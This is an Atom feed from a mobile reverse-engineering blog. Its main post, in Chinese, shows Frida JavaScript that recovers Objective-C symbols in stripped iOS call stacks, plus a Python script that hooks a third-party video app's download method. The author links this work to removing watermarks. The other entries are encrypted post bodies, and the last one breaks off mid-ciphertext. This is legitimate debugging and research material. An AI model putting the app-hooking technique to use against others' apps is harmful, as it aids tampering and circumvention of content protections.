<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-02T13:04:25.994Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1/Eoy+Eptuu+rfnkQR2znvKTbjQWD3PtPOtWanqLT/p5Hi2qrhqe67jAGvR4qc47Pqwj2mG4pO6BKWcxFxr3rkJaGHC67vmcLLkDyeRSRYM4kKRWkxT9T/+p9EDW1zddKTOKkvmr83VmMJFOasHTRL42WyGqq1j+dRcyLMXT1dvzaIJa/eBoZcVojA/CSPC1fV7Z9RThHwynefvFmi3ujlOtKgw8Y/918b8u2B6GQOyCMCI+l626KxBALTDa0Y3vaSZDmccUm2LGon/l5X65rWeeLvwY41lUtuKcndRt4TAhMKky/09TqsUg7XwvXRmj7Pn671SA6Vg+ZRHNRZV3r/EmwSESZWIuXXAdcALd/r0cZgl3zjXOZqPhgYpX3G7aAsU/AmIg3vBOsnqnaZXCx3iqGPUWP0sDAGZydndac6AkARrd5Yl2WHVk6GpaVMCFxUx/5UkKrY7dcQqrVG8oh/sV7wAoRADXCgyD88N53F57xoLFqZSVwERdswDIug+VhVlqFBhKPFTPZTbuO+ucQ36Era9BE4z9+GaPNxAA0h43lcCzK4qIxwdcDqf1U6tLIGyX9NRWg64pH9PZKpPD5Ko5F2Hl55RJ1jiE9ayz7Ekb5HEU4EO5qKVxOMcPoROnUMot6SJf2pUz5WCw+oDrhyfprEIofJxClCckuNyOwAunoqXigY8yFxt2769hgzLeEuAMToC4fdp9KV/b+5Xz86LmYKkkiFk52NQobPb+b3Vqkbw+1H2AhKSPHGRVDc8yWIAocuZtNxVsQBh1udtycixVDGB7nO9BLB9DsVIBWFcU4+nmqjaIRYdpat4hvYWuRbByBb3zUuUx15H5Wd4eSq6FtikN19VGykKsyO4tbG4SwxEhi3tL4FBDEZUVXCdcHTn6RUmxF/IqdwJR+2V+OWp5AcFWVItnmQy7oUxeehFHC6/Bh5NBMn3t8jLV9T7xyL4rscQrgeS7Xgm9KSAgwYoJgNyAVVUsZwLEHBEtCOyyyINMZB0T6oFqhAV6hZb+go8OA0VlECyuI2q7bw1rtFITsucgcxQhrYK+V77BBKC355MWcmt4AQIp0gxaR7nTGwxCf3EiP+UNB6LqwxychYvo0oPlxsV5V14ws+bHI6+aRWhd3xarVGNPcfyBlLKi0wdfGY9g3QS49g6cF3lW/PTXAXRPt3sjtGkxK+brGl5d1ATUq6lmNHXMwCfD494bNsfMfzcfORKCVKqQlG0O6fVnX6vOSCk+q5DN4m8ZxX44TkktfytJkkDuswI8H3F6vWgsphlNiTxrZW9eJlHtKeNVeFxfNo4PhNRvM6oa36m937BoJBGFUnfcLpc8e5d+N2Z/L4zwshODN/Pfy0e/FsMtMnXN9UMdLx80yaj9mbtWn3gxYghHHbkwJhOA/jbCoFx4Sh9zoCFY9llG1j8BzLk62vH6PLCblnKc3fW7BPG9I8TDU5I0tM8m7Lwrhcx/v5ihJeAzKQyORK/XNPtI7uLcyjErvk1zVkHsrOzoWH9vjJS7EgRhrqC4XPRSHf8mC5In8